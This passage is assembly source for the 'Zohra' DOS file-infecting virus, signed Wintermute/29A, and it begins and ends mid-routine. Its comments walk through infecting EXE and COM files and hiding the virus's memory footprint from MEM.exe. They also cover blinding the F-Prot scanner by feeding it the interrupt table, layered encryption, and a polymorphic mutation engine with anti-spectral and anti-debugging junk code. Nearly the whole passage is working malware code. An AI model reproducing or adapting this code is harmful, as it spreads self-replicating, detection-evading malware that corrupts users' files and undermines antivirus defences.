                   cmp     ds:[si],'EX'                ; ¨ Is it an .Exe ?
                   jz      Es_un_exe
                   jmp     Podriaseruncom
   Es_un_exe:
                   mov     ax,3d02h                    ; Open r/w
                   div     bp

                   jnc     continua_infecci¢n
   nos_piramos:    jmp     vamonox

   ant_memory_test:
                   lea     di,int21h           ; Restore original int21h
                   lds     dx,cs:[di]
                   mov     ax,2521h
                   div     bp
   Memory_test:        ; The virus gets here if the Mem.exe file has been
                       ;executed: if that's right, it adds it's size to the
                   call    get_z_mcb  ; last Mcb so it appears the same free
                   add     es:[3],((virus_size/16)*2)+22h ; memory than before
                   inc     byte ptr cs:[flag1]   ; installing ( later it's
                   jmp     vamonox               ; restored, of course ;) )
   Ir_cerrar:      jmp     cerramos


   continua_infecci¢n:
                   xchg    bx,ax
                   push    bx
                   call    @get_da_sft         ; Let's go with Sft infection!
                   pop     bx

                   push    es di
                   lea     dx,header           ; We read the exe header...
                   push    cs cs
                   pop     ds es
                   mov     ah,3fh
                   mov     cx,01ch
                   div     bp
                   mov     si,dx               ; and move it to the second copy
                   mov     di,virus_size+201h+offset header ; of the virus
                   rep     movsb
                   pop     di es

                   cmp     word ptr es:[di+11h],01f40h ; Too little file ?
                   jb      ir_cerrar


                                ;File size=file image+header?
                   mov     ax,word ptr es:[di+11h]
                   mov     dx,word ptr es:[di+13h]
                   push    ax dx
                   mov     ax,word ptr [header+4]   ; Number of pages
                   dec     ax
                   mov     cx,200h
                   mul     cx
                   add     ax,word ptr [header+2]  ; Last page
                   adc     dx,0                    ; dx-ax length of file
                   pop     cx si
                   cmp     cx,dx                   ; Jumps also if attrib<>0, so
                   jnz     ir_cerrar               ;doesn't infect +r files. I
                   cmp     si,ax                   ;thought to change some
                   jnz     ir_cerrar               ;things, but I prefer it this
                                                   ;way: slowest reproduction


                   mov     al,byte ptr [header]        ; Is it MZ ?
                   add     al,byte ptr [header+1]
                   cmp     al,'M'+'Z'
                   jnz     Ir_Cerrar

                   mov     ax,word ptr es:[di+0dh]
                   and     al,1eh          ; Is it infected ?
                   xor     al,1eh
                   jz      ir_cerrar
                   push    word ptr es:[di+0dh]
                   push    word ptr es:[di+0fh]


                   push   offset rout_fecha ;( this to be called by the Com
   @comp_tiempo:                            ;infector )
                                           ; Doesn't infect if the file date
                   mov     ah,2ah          ;is the same today's date ( to avoid
                   div     bp              ;bait-files and some antivirus
                   mov     ax,word ptr es:[di+0fh] ;programs that use this like
                   mov     cx,ax           ;Shitvircible )
                   and     ax,01fh
                   cmp     al,dl
                   jnz     puedes_seguir
                   and     cx,01e0h
                   ror     cx,5
                   cmp     cl,dh
                   jnz     puedes_seguir
                   add     sp,6h
                   jmp     fecha
   puedes_seguir:
                   ret
   rout_fecha:
                   mov     ax,word ptr es:[di+11h]
                   mov     dx,word ptr es:[di+13h]
                   mov     es:[di+15h],ax
                   mov     es:[di+17h],dx
                   mov     cx,10h
                   div     cx
                   sub     ax,word ptr ds:[header+8]
                   mov     byte ptr ds:[1],dl  ; Delta offset, we put it in the
                                               ;instructions

                   call    copiarse

                   mov     ds:word ptr [cs_ip+2],ax    ; We actualize header
                   inc     ax
                   mov     ds:word ptr [ss_sp],ax
                   mov     ds:word ptr [cs_ip],dx
                   mov     ds:word ptr [ss_sp+2],((virus_size+300h-15h)/2)*2

                   mov     ax,word ptr es:[di+11h]
                   mov     dx,word ptr es:[di+13h]
                   mov     cx,200h
                   div     cx
                   inc     ax
                   mov     word ptr [header+2],dx        ; File size, etc
                   mov     word ptr [header+4],ax
                   mov     word ptr [header+0ah],((virus_size)/16)+10h

                   mov     word ptr es:[di+15h],0
                   mov     word ptr es:[di+17h],0
                   mov     ah,40h      ; Write header
                   mov     cx,01ch
                   lea     dx,header
                   push    cs
                   pop     ds
                   div     bp

   fecha:
                   pop     dx cx
                   mov     ax,5701h
                   or      cl,1fh          ; New file time
                   div     bp


   cerramos:
                   mov     ah,3eh              ; Closing
                   div     bp

   vamonox:
                   pop     ax ds dx            ; Restore int24h
                   div     bp

                   pop     ax ds dx            ; Restore int0h
                   div     bp

                   call    pop_all_regs

                   jmp     salto_a_int21h

   ;****************************************************************************
   ;                               3fh Handler
   ;----------------------------------------------------------------------------

   get_prog_in_env:            ; This routine gets the name of the program that
                               ;is executing in this moment; compares the name
                               ;that was sent in Dx with the two first letters
                               ;of it.

                   mov     ah,62h              ; Active Psp
                   int     21h
                   mov     es,bx
                   mov     es,word ptr es:[2ch]    ; environment_segment
                   xor     di,di
                   mov     al,0
   @find_em:       scasb
                   jnz     @find_em
                   cmp     byte ptr es:[di],0
                   jnz     @find_em
                   add     di,3
   miremos:
                   mov     bx,word ptr es:[di] ; Compares dx, set by the
                   cmp     dx,bx               ;previous routine, with what
                   jnz     sigamos_con_eto     ;we've found as file name

                   stc                         ; We left the carry set if it
                   ret                         ;found it.

   sigamos_con_eto:
                   mov     al,5ch              ; Searches '\'
   joder_busca:    scasb
                   jz      miremos
                   cmp     byte ptr es:[di],0h ; Or the end
                   jnz     sigamos_con_eto
   volvemos_ya:
                   clc
                   ret

   ;****************************************************************************
   ;                         Function 3fh handler
   ;----------------------------------------------------------------------------

   lets_do_stuff:      ; I had a little monkey I sent him to the country

                   xchg    ah,al
                   call    push_all_regs
                   cmp     al,1
                   jz      @vete_pues
                   cmp     bx,8
                   jnz     @vete_pues
                   mov     dx,'-F'             ; F-prot ?
                   call    get_prog_in_env
                   jnc     @vete_pues
                   call    pop_all_regs

                   pushf
                   call    dword ptr cs:[int21h]
                   call    push_all_regs
                   push    ds dx   ; Breaks F-prot's ability of detecting
                   pop     di es   ;viruses: when it reads data from a file,
                   xor     si,si   ;the virus sends the interrupt vector table,
                   mov     ds,si   ;so F-prot --doesn't detect any virus--
                   rep     movsb

                   call    pop_all_regs
                   retf    2

   @vete_pues:
                   call    pop_all_regs
                   jmp     salto_a_int21h

   ;****************************************************************************
   ;                              Com infection
   ;----------------------------------------------------------------------------
   ; 'Pon la mano as¡ como si fueras a pedir...'

   nosvamosya:
                   jmp     cerramos

   podriaseruncom:

                   cmp     ds:[si],'MO'                ; Is it a Com file ?
                   jnz     nosvamosya

                   mov     ax,3d02h                    ; Open r/w
                   div     bp
                   jc      nosvamosya

   sigamosconeto:
                   xchg    ax,bx
                   push    bx
                   call    @get_da_sft                 ; We get the file sft
                   pop     bx

                   push    cs
                   pop     ds

                   cmp     word ptr es:[di+11h],01f40h ; Too short ?
                   jb      nosvamosya
                   cmp     word ptr es:[di+11h],0ffffh-virus_size-300h
                   ja      nosvamosya              ; Too large ?


                   mov     ax,word ptr es:[di+0dh]
                   and     al,1eh                      ; Infected ?
                   xor     al,1eh
                   jz      nosvamosya
   no_rulado_aun:
                   push    word ptr es:[di+0dh]        ; Push time/date
                   push    word ptr es:[di+0fh]
                   call    @comp_tiempo

                   mov     ah,3fh
                   mov     cx,3                        ; Read first three bytes
                   lea     dx,header+201h+virus_size
                   div     bp

                   mov     al,byte ptr ds:[header+201h+virus_size]
                   add     al,byte ptr ds:[header+202h+virus_size] ;
                   cmp     al,'M'+'Z'                  ; Exe header ?
                   jz      vamos_a_cerrar

                   mov     ax,word ptr es:[di+11h]     ; File length
                   push    ax
                   sub     ax,3
                   mov     word ptr[salto_com+virus_size+202h],ax   ; We prepare
                   mov     word ptr es:[di+15h],0    ;first bytes
                   lea     dx,salto_com+virus_size+201h
                   mov     cx,3                        ; And write them
                   mov     ah,40h
                   div     bp


                   pop     ax
                   mov     word ptr es:[di+15h],ax
                   add     ax,300h
                   mov     word ptr ds:[1],ax      ; For the poly engine


                   call    copiarse                ; Jump to copy it
                   mov     byte ptr ds:[2],02h

   vamos_a_cerrar:

                   jmp     fecha                   ; Go to restore date, close.


   thetext:        db 'Zohra will live forever ! Necromancy with her...',0
   nombre:         db '[Zohra] virus by Wintermute/29A, dedicated to the best '
                   db 'Necromancer of the Forgotten Realms,... I assure you '
                   db 'will live forever, my love... ;)',0

   header:         db 0ah dup (?)
   minalloc:       db 0,0
   maxalloc:       db 0,0
   SS_SP:          dw 0,offset virus_end+100h
   Checksum:       dw 0
   CS_IP:          dw offset host,0,0,0,0,0
   salto_com:      db 0e9h,0,0
   flag1:          db 0

   encrypt_end     label byte
   buffer_uuencode equ ((encriptado/7)-1)

   buffer:         db buffer_uuencode+1 dup (?)

   ;                *********** ENCRYPTION ***********

   copiarse:
                   call    push_all_regs
                   mov     bp,virus_size+201h ; second copy
                   push    cs
                   pop     ds

                   call    rut_encriptado      ; UUencode encryptor
                   call    poly_engine         ; We make decryptor

                   push    dx
                   mov     ah,40h
                   mov     dx,virus_size+1
                   mov     cx,virus_size+202h
                   pushf
                   call    dword ptr cs:[int21h]   ; Copy the virus
                   pop     dx

                   call    encryptit           ; Xor decryption
                   call    rut_desencriptado   ; UUencode decryption
                   call    pop_all_regs

                   ret

   ;  These two routines, rut_encriptado and rut_desencriptado are the first
   ; encryption of the virus; it's same as UUencode programs use to code ascii
   ; message. I'll explain:
   ;
   ;  The virus takes one byte of the zone that's going to be encrypted: saves
   ; in buffer_uuencode it's most significative bit and changes this bit in the
   ; encrypted zone to 1 ( with an or 080h ). It does this with seven of them,
   ; making a rol to the byte which contains the original bits; after that, it
   ; begins with another seven bytes crunch. So that, engines like Tbscan can
   ; decrypt the Xor routine, but not this one.
   ;
   ;  To decrypt, just the opposite; it takes each byte of the buffer ( each
   ; has seven high bits, beeing it's own most significative bit a 1, to
   ; keep on the UUencode chain ), and it replaces the original ones in the
   ; virus.

   rut_encriptado:
                   push    bx              ; File_handle !
                   mov     cx,buffer_uuencode
                   lea     si,encrypt_start+bp ; 7 bytes

   bloque_7:
                   push    cx
                   xchg    bx,cx
                   add     bx,bp

                   lea     di,[buffer+bx]      ; Block number plus buffer
                   mov     cx,7                ;address
                   mov     dx,1

   sigg:
                   not     cs:byte ptr[si]     ; Not the bytes
                   mov     al,byte ptr[si]
                   or      byte ptr[si],080h
                   and     al,080h
                   rol     al,1
                   shl     dx,1
                   add     dl,al
                   inc     si
                   loop    sigg
                   mov     byte ptr [di],dl

                   pop     cx
                   loop    bloque_7

                   pop     bx
                   ret

   ; DESENCRIPTACION

   rut_desencriptado:

                   push    bx          ; Save handle
                   mov     cx,buffer_uuencode
                   lea     si,cs:[encrypt_start+bp]

   bloques_de_7:

                   push    cx
                   xchg    bx,cx
                   mov     cx,7
                   add     bx,bp
                   lea     di,[buffer+bx]

                   mov     al,byte ptr[di]
                   rol     al,2

   un_bloque:
                   push    ax
                   and     al,1
                   ror     al,1
                   or      al,07fh
                   and     byte ptr [si],al   ; If Al is 0, it doesn't touch it
                   not     cs:byte ptr [si]
                   inc     si
                   pop     ax
                   rol     al,1
                   loop    un_bloque
                   pop     cx
                   loop    bloques_de_7
                   pop     bx
                   ret

   ;***************
   ;***************

   offset_second   equ     virus_size+201h

   poly_engine:

                   add     dx,word ptr [encryptvalue]+offset_second
                   mov     word ptr [encryptvalue]+offset_second,dx

                   push    offset go_here
   encryptit:
                   mov     di,offset_second
                   mov     cx,virus_size/2

   enc_loop:
                   xor     [di],dx
                   inc     di
                   inc     di
                   loop    enc_loop
                   ret

   ; ***************************************************************************
   ;                    THE NECROMANTIC MUTATION ENGINE ( NME )
   ; ***************************************************************************
   ;              The ants are in the sugar, the muscles atrophied

     ; Set the decryptor variables ( loop pointer, remaining instructions and
     ;current instruction )

   go_here:

                   mov     word ptr [bytes_referencia],0h
                   mov     word ptr [restantes_poly],200h   ; n.instr decryptor
                   mov     byte ptr [numero_instruccion],6h ; n.instr funcionales


     ; This first part of the poly engine fills the blancks of the six blocks
     ;( 5 bytes each ) in which the decryptor instructions are divided on with
     ;random instructions.

                   push    cs cs
                   pop     ds es

                   mov     di,3h
                   mov     cx,3
   two_times:      call    aleatorio
                   and     ah,1
                   jz      two_of_one
                   call    inst_2
                   jmp     next_inst_gen
   two_of_one:     call    inst_1
                   inc     di
                   call    inst_1
   next_inst_gen:  cmp     di,0eh
                   jnz     @di0dh
                   mov     di,017h
                   jmp     @loopt
   @di0dh:         mov     di,0dh
   @loopt:         loop    two_times


                   mov     di,011h
                   mov     cx,2
   two_times_otavez:
                   call    aleatorio
                   and     ah,1
                   jz      unod1y1d2
                   and     al,1
                   jz      tresd1
                   call    inst_3
                   jmp     next_one_otave
   tresd1:
                   call    inst_1
                   inc     di
                   call    inst_1
                   inc     di
                   call    inst_1
                   jmp     next_one_otave
   unod1y1d2:      and     al,1
                   jz      unod2y1d1
                   call    inst_1
                   inc     di
                   call    inst_2
                   jmp     next_one_otave
   unod2y1d1:
                   call    inst_2
                   inc     di
                   call    inst_1
   next_one_otave:
                   mov     di,01dh         ; The last
                   call    inst_1

                   lea     di,instrucciones
                   xor     si,si
                   mov     cx,instrsize
                   rep     movsb

     ; This part exchanges 50% times Si and Di registers, which are used in
     ;the decryptor instructions

                   call    aleatorio
                   and     ah,1
                   jz      sin_cambios_sidi
                   mov     byte ptr [instrucciones+7h],0beh
                   mov     byte ptr [instrucciones+10h],0f5h
                   mov     word ptr [instrucciones+15h],03c31h ; ¨ 313c ?
                   mov     word ptr [instrucciones+19h],04646h


   sin_cambios_sidi:

     ; Depending on a random value, cx is obtained by the normal way ( mov cx, )
     ; or with a mov dx, register, mov cx,dx

                   call    aleatorio
                   and     ah,1
                   jz      cx_acabado
                   cbw
                   and     ah,1
                   jz      siguiente_abajo
                   mov     byte ptr [instrucciones+0ah],0bbh
                   mov     word ptr [instrucciones+0dh],0d989h
                   jmp     cx_acabado
   siguiente_abajo:
                   and     al,1
                   jz      cx_con_dx
                   mov     byte ptr [instrucciones+0ah],0b8h
                   mov     word ptr [instrucciones+0dh],0c189h
                   jmp     cx_acabado
   cx_con_dx:
                   mov     byte ptr [instrucciones+0ah],0bah
                   mov     word ptr [instrucciones+0dh],0d189h
   cx_acabado:

     ; To finish preparing the decrypting routine, we push the instructions that
     ;modify si, di and cx in the decryptor, and pop them randomly.

                   push    dx
                   mov     byte ptr [variable_inst],00000111b
                   mov     cx,015d                 ; Copy the 15 bytes of the
                   lea     si,instrucciones+5      ;instructions to the uuencode
                   lea     di,buffer               ;buffer ( unused )
                   push    di
                   rep     movsb
                   pop     si

   ver_si_esta_hecho:
                   mov     al,byte ptr [variable_inst]
                   mov     dl,al                   ; Then, restore them in a
                   or      al,al                   ;random order
                   jz      acabado_pop_inst
                   call    aleatorio
                   and     ah,1
                   jz      popfirst
                   and     al,1
                   jz      popsecond
                   and     dl,100b                 ; First instruction ( five
                   jz      ver_si_esta_hecho       ;bytes )
                   and     byte ptr [variable_inst],11111011b
                   lea     di,instrucciones+0fh
                   jmp     popfivebytes

   popfirst:
                   and     dl,1b                   ; Second one
                   jz      ver_si_esta_hecho
                   and     byte ptr[variable_inst],011111110b
                   lea     di,instrucciones+0ah
                   jmp     popfivebytes

   popsecond:
                   and     dl,10b                  ; Third
                   jz      ver_si_esta_hecho
                   and     byte ptr[variable_inst],011111101b
                   lea     di,instrucciones+5h
   popfivebytes:
                   mov     cx,5d                   ; Replace
                   rep     movsb
                   jmp     ver_si_esta_hecho
   acabado_pop_inst:
                   pop     dx


     ; The modification of the instructions of the decryptor finishes here with
     ;all changes made: the originals are kept at the beggining of the virus in
     ;memory. The posible 'final loop' exchange is made when writing the
     ;decryptor

     ; Here begins the main zone of the code generator; where it's decided
     ;what generator to use and random instructions are copied at the
     ;decryptor.


                   mov     di,virus_size+1
   centro_poly:
                   mov     ax,word ptr [restantes_poly]    ; Remaining
                   mov     cx,ax                           ;instructions
                   and     cx,cx
                   jnz     sigamos_decriptor
                   jmp     acabamos_decryptor      ; Checks
   sigamos_decriptor:
                   cmp     cx,@getmcb-ant_debug
                   jae     @cont_decrr
                   cmp     byte ptr [numero_instruccion],1
                   jz      @@call_decryptgen
   @cont_decrr:
                   dec     cx
                   jz      @@call_inst_1
                   dec     cx
                   jz      @@call_inst_2
                   dec     cx
                   jz      @@call_inst_3

                   mov     cx,55h      ; Do we need to put one of the decryptor
                   div     cl          ;instructions ?
                   inc     al
                   cmp     byte ptr[numero_instruccion],al
                   ja      @@call_decryptgen

                   cmp     byte ptr[numero_instruccion],1
                   jnz     @continuemos        ; To avoid the loop from going
                   mov     ax,di               ;out of range
                   sub     ax,word ptr [loop_site]
                   cmp     ax,70h
                   jae     @@call_decryptgen
   @continuemos:
                   call    aleatorio
                   and     ah,1
                   jz      @@trestipos
                   and     al,1
                   jz      @@call_inst_4
   @@call_inst_1:  call    inst_1
                   dec     word ptr [restantes_poly]
                   inc     di
                   jmp     centro_poly
   @@call_inst_4:  call    inst_4
                   add     di,4
                   sub     word ptr [restantes_poly],4
                   jmp     centro_poly

   @@trestipos:    cbw
                   and     ah,1
                   jz      @@inst_2odec
                   and     al,11b
                   jz      @@call_sub
   @@call_inst_3:  call    inst_3
                   add     di,3
                   sub     word ptr[restantes_poly],3
                   jmp     centro_poly
   @@inst_2odec:   and     al,111b     ; Low probability
                   jnz     @@call_inst_2
   @@call_decryptgen:
                   call    gen_instruction
                   jmp     centro_poly
   @@call_inst_2:  call    inst_2
                   inc     di
                   sub     word ptr[restantes_poly],2
   @fix1:          jmp     centro_poly
   @@call_sub:     cmp     word ptr[restantes_poly],@getmcb-ant_debug
                   jb      @fix1
                   call    inst_5
                   add     di,si
                   sub     word ptr[restantes_poly],si  ; Long non fixed size
                   jmp     centro_poly             ;routine


   acabamos_decryptor:
                   ret

   instrsize       equ     instr_end-instr_start

   instr_start     label byte

     ; Decryptor instructions list; divided into five-bytes blocks.

   instrucciones:

                   mov     bp,0200h
                   db      90h,90h         ; variable ( junk gen )
           ;5
                   mov     si,cs:word ptr [encryptvalue+bp]
           ;A
                   mov     cx,virus_size/2
                   db      90h,90h
           ;F
                   mov     di,bp
                   db      90h,90h,90h

   loop_dec:    ;14h
                   xor     word ptr cs:[di],si
                   db      90h,90h
           ;19h
                   inc     di
                   inc     di
                   loop    loop_dec
                   db      90h  ;1dh
   ;               db      90h,90h,90h

   instr_end       label byte

   ;*******************************************
   ;               Decryptor values
   ;--------------------

   Restantes_poly:     dw 200h         ; Remaining instructions counter
   Numero_instruccion: db 6            ; Instruction number
   num_aleat:          dw 1250h        ; Aleatory number counter
   variable_inst:      db 7h           ; 0111b
   loop_site:          dw 0h           ; Looping allocation Offset
   bytes_referencia:   dw 0h           ; Reference for instructions


     ; This returns a random number in Ax after making some operations.

   aleatorio:
                   mov     ax,word ptr[num_aleat]
                   call    aleat2
   aleat2:         ror     ax,5          ; The seed number is stablished in each
                   add     ax,1531h      ;infection by the date, and modified
                   push    cx dx ax      ;by the minutes ( but in Al, the last
                   mov     ah,2ch        ;used, to contribute to the slow poly )
                   int     21h           ;and hour.
                   pop     ax
                   add     ah,ch
                   pop     dx cx
                   rol     ax,1
                   neg     ax
                   sub     ax,2311h
                   ror     ax,3
                   not     ax
                   mov     word ptr[num_aleat],ax
                   ret

     ; Instructions generators: the required instructions are generated and
     ;copied in es:di, which points to the decryptor in memory

     ; Main generator: Copies a decryptor instruction in es:di, with special
     ;care for the final loop

   gen_instruction:
                   mov     al,byte ptr [numero_instruccion]
                   and     al,al
                   jz      @vasmosnos
                   dec     al
                   jz      @preparar_loop
                   dec     al
                   jz      @guardar_paraloop
   @gen_ya:
                   dec     byte ptr [numero_instruccion]
                   lea     si,instrucciones
                   add     si,word ptr [bytes_referencia]
                   add     word ptr [bytes_referencia],5h

                   mov     cx,5
                   rep     movsb
                   sub     word ptr[restantes_poly],5h


   @vasmosnos:     ret
   @guardar_paraloop:
                   mov     word ptr [loop_site],di
                   jmp     @gen_ya

   @preparar_loop:
                   mov     ax,0fch
                   mov     si,di
                   mov     cx,word ptr [loop_site]
                   sub     si,cx
                   sub     ax,si
                   mov     cx,word ptr[num_aleat]
                   and     cl,1
                   jz      @make_a_jnz
                   mov     byte ptr [instrucciones+01ch],al
                   jmp     @gen_ya
   @make_a_jnz:
                   mov     word ptr [instrucciones+01bh],7549h
                   dec     ax
                   mov     byte ptr [instrucciones+01dh],al
                   jmp     @gen_ya

     ; Generator ----> One byte length instructions generator

   inst_1:
                   call    aleatorio
                   and     al,3h
                   jnz     @cont_a1
                   mov     byte ptr es:[di],90h
                   ret
   @cont_a1:       and     ah,1
                   jz      @cont_a2
                   call    aleatorio
                   and     ah,1h
                   jz      @cont_a2_2
                   and     al,1h
                   jz      @cont_a2_1_1
                   call    aleatorio
                   and     al,1h
                   jz      @cont_a2_2_1
                   mov     byte ptr es:[di],42h     ; inc dx
                   ret
   @cont_a2_2_1:   mov     byte ptr es:[di],43h     ; inc bx
                   ret
   @cont_a2_1_1:   mov     byte ptr es:[di],40h     ; inc ax
                   ret
   @cont_a2_2:     call    aleatorio
                   and     al,1h
                   jnz     @cont_a2_2_2
                   mov     byte ptr es:[di],48h     ; dec ax
                   ret
   @cont_a2_2_2:   and     ah,1h
                   jz      @cont_a2_2_2_2
                   mov     byte ptr es:[di],4bh     ; dec bx
                   ret
   @cont_a2_2_2_2: and     al,1h
                   mov     byte ptr es:[di],4ah     ; dec dx
                   ret
   @cont_a2:       call    aleatorio
                   and     al,3h
                   jz      @cont_a2_11
                   and     ah,3h
                   jz      @cont_a2_12
                   call    aleatorio
                   and     al,3h
                   jz      @cont_a2_2_11
                   and     ah,3h
                   jz      @cont_a2_2_12
                   call    aleatorio
                   and     al,1
                   jz      @cont_a2_2_13
                   mov     byte ptr es:[di],0cch    ; int 3h
                   ret
   @cont_a2_2_11:  mov     byte ptr es:[di],9fh     ; lahf
                   ret
   @cont_a2_2_12:  mov     byte ptr es:[di],99h     ; cwd
                   ret
   @cont_a2_2_13:  mov     byte ptr es:[di],98h     ; cbw
                   ret
   @cont_a2_11:    mov     byte ptr es:[di],0F9h    ; stc
                   ret
   @cont_a2_12:    mov     byte ptr es:[di],0F8h    ; clc
                   ret

     ; Generator ----> Two bytes length instructions

   inst_2:
                   call    aleatorio
                   and     ah,1h
                   jz      @cont_sub
                   cbw
                   and     ah,1h
                   jz      sigunvm
                   jmp     @cont_xor
   sigunvm:
                   jmp     @cont_mul
   @cont_sub:
                   mov     byte ptr es:[di],2bh
                   inc     di
                   cbw
                   and     al,1
                   jz      @cont_bsub_ax
                   and     ah,1
                   jz      @cont_bsub_dx
                   call    aleatorio
                   and     ah,1
                   jz      @cont_bsub_bx_dxdisi
                   and     al,1
                   jz      @cont_bsub_bx_cx
                   mov     byte ptr es:[di],0d8h  ; sub bx,ax
                   ret
   @cont_bsub_bx_cx:
                   mov     byte ptr es:[di],0d9h  ; sub bx,cx
                   ret
   @cont_bsub_bx_dxdisi:
                   cbw
                   and     ah,1
                   jz      @cont_bsub_bx_dx
                   and     al,1
                   jz      @cont_bsub_bx_di
                   mov     byte ptr es:[di],0deh   ; sub bx,si
                   ret
   @cont_bsub_bx_di:
                   mov     byte ptr es:[di],0dfh   ; sub bx,di
                   ret
   @cont_bsub_bx_dx:
                   mov     byte ptr es:[di],0dah  ; sub bx,dx
                   ret
   @cont_bsub_ax:
                   call    aleatorio
                   and     ah,1
                   jz      @cont_bsub_ax_dxdisi
                   and     al,1
                   jz      @cont_bsub_ax_cx
                   mov     byte ptr es:[di],0c3h  ; sub ax,bx
                   ret
   @cont_bsub_ax_cx:
                   mov     byte ptr es:[di],0c1h  ; sub ax,cx
                   ret
   @cont_bsub_ax_dxdisi:
                   cbw
                   and     ah,1
                   jz      @cont_bsub_ax_dx
                   and     al,1
                   jz      @cont_bsub_ax_di
                   mov     byte ptr es:[di],0c6h  ; sub ax,si
                   ret
   @cont_bsub_ax_di:
                   mov     byte ptr es:[di],0c7h  ; sub ax,di
                   ret
   @cont_bsub_ax_dx:
                   mov     byte ptr es:[di],0c2h  ; sub ax,dx
                   ret
   @cont_bsub_dx:
                   call    aleatorio
                   and     ah,1
                   jz      @cont_bsub_dx_sidicx
                   and     al,1
                   jz      @cont_bsub_dx_bx
                   mov     byte ptr es:[di],0d0h     ; sub dx,ax
                   ret
   @cont_bsub_dx_bx:
                   mov     byte ptr es:[di],0d3h     ; sub dx,bx
                   ret
   @cont_bsub_dx_sidicx:
                   cbw
                   and     ah,1
                   jz      @cont_bsub_dx_cx
                   and     al,1
                   jz      @cont_bsub_dx_di
                   mov     byte ptr es:[di],0d6h     ; sub dx,si
                   ret
   @cont_bsub_dx_di:
                   mov     byte ptr es:[di],0d7h     ; sub dx,di
                   ret
   @cont_bsub_dx_cx:
                   mov     byte ptr es:[di],0d1h     ; sub dx,cx
                   ret

   @cont_xor:
                   mov     byte ptr es:[di],033h
                   inc     di
                   call    aleatorio
                   and     ah,1
                   jz      @cont_xor_4last
                   cbw
                   and     ah,1
                   jz      @cont_xor_34
                   and     al,1
                   jz      @cont_xor_2
                   mov     byte ptr es:[di],0c0h     ; xor ax,ax
                   ret
   @cont_xor_2:
                   mov     byte ptr es:[di],0c3h     ; xor ax,bx
                   ret
   @cont_xor_34:
                   and     al,1
                   jz      @cont_xor_4
                   mov     byte ptr es:[di],0c2h     ; xor ax,dx
                   ret
   @cont_xor_4:
                   mov     byte ptr es:[di],0dbh     ; xor bx,bx
                   ret
   @cont_xor_4last:
                   cbw
                   and     ah,1
                   jz      @cont_xor_78
                   and     al,1
                   jz      @cont_xor_6
                   mov     byte ptr es:[di],0d8h     ; xor bx,ax
                   ret
   @cont_xor_6:
                   mov     byte ptr es:[di],0dah     ; xor bx,dx
                   ret
   @cont_xor_78:
                   and     al,1
                   jz      @cont_xor_8
                   mov     byte ptr es:[di],0d2h     ; xor dx,dx
                   ret
   @cont_xor_8:
                   mov     byte ptr es:[di],0d0h     ; xor dx,ax
                   ret

   @cont_mul:
                   mov     byte ptr es:[di],0f7h
                   inc     di
                   call    aleatorio

                   and     ah,1
                   jz      @cont_divmul_34
                   and     al,1
                   jz      @cont_divmul_2
                   mov     byte ptr es:[di],0e3h       ; mul bx
                   ret
   @cont_divmul_2:
                   mov     byte ptr es:[di],0e1h       ; mul cx
                   ret
   @cont_divmul_34:
                   and     al,1
                   jz      @cont_divmul_4
                   mov     byte ptr es:[di],0e6h       ; mul si
                   ret
   @cont_divmul_4:
                   mov     byte ptr es:[di],0e7h       ; mul di
                   ret

     ; Generator ----> Three bytes long instructions

   inst_3:
                   call    aleatorio
                   mov     si,ax
                   inc     si              ; We don't want a 0ffffh
                   jz      inst_3
                   dec     si
                   and     ah,1
                   jz      @add_or_sub_ax
                   and     al,1
                   jz      @mov_dx_inm
                   mov     byte ptr es:[di],0bbh   ; mov bx,reg
                   mov     word ptr es:[di+1],si
                   ret
   @mov_dx_inm:    mov     byte ptr es:[di],0bah   ; mov dx,reg
                   mov     word ptr es:[di+1],si
                   ret
   @add_or_sub_ax: and     al,1
                   jz      @mov_mem_ax
                   mov     byte ptr es:[di],05h    ; add ax,reg
                   mov     word ptr es:[di+1],si
                   ret
   @mov_mem_ax:    mov     byte ptr es:[di],0a1h   ; mov ax,mem
                   mov     word ptr es:[di+1],si
                   ret

     ; Generator ----> Four bytes instructions

   inst_4:         call    aleatorio
                   mov     si,ax
                   inc     si
                   jz      inst_4
                   dec     si
                   and     ah,1
                   jz      @q_seg_parte
                   cbw
                   and     ah,1
                   jz      @q_movdxobx
                   and     al,1
                   jz      @q_subbxfuck
                   mov     word ptr es:[di],019b4h     ; Get drive function
                   mov     word ptr es:[di+2],021cdh
                   ret
   @q_subbxfuck:   mov     word ptr es:[di],0eb81h
                   mov     word ptr es:[di+2],si
                   ret
   @q_movdxobx:    and     al,1
                   jz      @q_movdx_mem
                   mov     word ptr es:[di],01e8bh
                   mov     word ptr es:[di+2],si
                   ret
   @q_movdx_mem:   mov     word ptr es:[di],0168bh
                   mov     word ptr es:[di+2],si
                   ret
   @q_seg_parte:   cbw
                   and     ah,1
                   jz      @q_seg_sub
                   mov     word ptr es:[di],0c281h
                   mov     word ptr es:[di+2],si
                   and     al,1
                   jz      @nosvamos_4
                   inc     byte ptr es:[di+1]
   @nosvamos_4:    ret
   @q_seg_sub:     mov     word ptr es:[di],0ea81h
                   mov     word ptr es:[di+2],si
                   and     al,1
                   jz      @nosvamos_41
                   inc     word ptr es:[di+1]
   @nosvamos_41:   ret

    ; Generator ----> More than 4 bytes routines

   inst_5:         call    aleatorio               ; Anti-spectral routine,
                   and     ah,1                    ;generates a random value
                   jz      @c_seg_parte            ;after a cmp ax,ax/jz xxx
                   and     al,1                    ;that will never be executed:
                   jz      @c_seg_prim             ;'spectral' is a way of
                   mov     word ptr es:[di],0c033h ;finding polymorphic viruses
                   mov     word ptr es:[di+2],0274h;that checks for instructions
                   call    aleatorio               ;that aren't in the poly
                   mov     word ptr es:[di+4],ax   ;engine; if the instructions
                   mov     si,06h                  ;are all of a fixed range,
                   ret                             ;the spectral identifies the
                                                   ;poly engine.

   @c_seg_prim:
                   mov     word ptr es:[di],0f7fah     ; Antidebugging routine
                   mov     word ptr es:[di+2],0f7dch   ;( cli, neg sp, neg sp,
                   mov     word ptr es:[di+4],0fbdch   ; sti )
                   mov     si,06h
                   ret

   @c_seg_parte:   and     al,1
                   jz      @c_seg_seg              ; Anti-spectral
                   mov     word ptr es:[di],0ffb8h     ; mov ax,0ffffh
                   mov     word ptr es:[di+2],040ffh   ; inc ax
                   mov     word ptr es:[di+4],0274h   ; jz  seguimos
                   call    aleatorio                   ; ( 2 crap bytes )
                   mov     word ptr es:[di+6],ax
                   mov     si,08h
                   ret

   @c_seg_seg:
                   lea     si,ant_debug            ; Antidebugging, the routine
                   mov     cx,@getmcb-ant_debug    ;placed near the beggining
                   push    cx                      ;of Zohra
                   rep     movsb
                   pop     si
                   sub     di,si
                   ret

   Int24h:         mov     al,3
                   iret

   Salto_a_int21h:
                   db      0eah
   int21h:         dw      0,0

   rutinadiv:                      ; The virus jumps here when a div bp is used
                   pushf           ;at the infection zone
